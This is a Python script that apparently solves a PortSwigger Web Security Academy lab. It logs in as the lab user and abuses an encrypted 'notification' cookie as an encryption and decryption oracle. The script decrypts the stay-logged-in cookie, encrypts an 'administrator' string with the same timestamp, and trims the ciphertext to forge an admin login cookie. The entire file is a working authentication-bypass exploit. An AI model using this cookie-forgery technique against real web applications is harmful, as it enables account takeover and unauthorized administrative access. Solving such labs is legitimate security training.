import requests
from urllib.parse import urljoin, unquote, quote
from requests.cookies import RequestsCookieJar
from typing import Tuple, Text, Union
from bs4 import BeautifulSoup
import bs4
import base64




base_url = 'https://ac221f731efb9672c03d21a6004d0071.web-security-academy.net'

def scrape_csrf(url: Union[Text, bytes], login_cookie=RequestsCookieJar()) -> Tuple[str, RequestsCookieJar]:
    get_response = requests.get(url, cookies=login_cookie)
    html = get_response.content.decode('utf-8')
    soup = BeautifulSoup(html, 'html5lib')
    csrf_input = soup.find('input', {'name': 'csrf'})
    csrf_token = csrf_input['value']
    return csrf_token, get_response.cookies


def get_own_cookies() -> RequestsCookieJar:
    url = urljoin(base_url, 'login')
    token, session = scrape_csrf(url)
    data = {
        'csrf': token,
        'username': 'wiener',
        'password': 'peter',
        'stay-logged-in': 'on'
    }
    response = requests.post(url, cookies=session, data=data, allow_redirects=False)
    assert response.status_code == 302
    return response.cookies




def encrypt(plain_text: str) -> str:
    token, cookies = scrape_csrf(urljoin(base_url, 'post?postId=9'))
    print(token, cookies)
    data = {
        'csrf': token,
        'postId': '9',
        'comment': 'adfs',
        'name': 'asdf',
        'email': plain_text,
        'website': 'http://example.com'
    }
    response = requests.post(urljoin(base_url, '/post/comment'), cookies=cookies, data=data, allow_redirects=False)
    return response.cookies['notification']


def decrypt(cypher_text: str, login_cookies: RequestsCookieJar) -> str:
    login_cookies['notification'] = cypher_text
    response = requests.get(urljoin(base_url, 'post?postId=9'), cookies=login_cookies)
    html = response.content.decode('utf-8')
    soup = BeautifulSoup(html, 'html5lib')
    error_message = str(soup.find('header', {'class': 'notification-header'}).decode_contents())
    return error_message.strip()

   


def chain():
    # extensive logging because requests sometimes fail
    login_cookies = get_own_cookies()
    decoded = unquote(login_cookies['stay-logged-in'])
    print(decoded)
    decrypted_cookie = decrypt(decoded, login_cookies)
    print(decrypted_cookie)
    timestamp = decrypted_cookie.replace('wiener:', '')
    print(timestamp)
    plain_text = 'xxxxxxxxxadministrator:' + timestamp
    cypher_text = encrypt(plain_text)
    inter = unquote(cypher_text)
    inter = base64.b64decode(inter)
    inter = inter[32:]
    inter = base64.b64encode(inter)
    inter = quote(inter)
    print(inter) # replace this cookie and delete the session
    

chain()
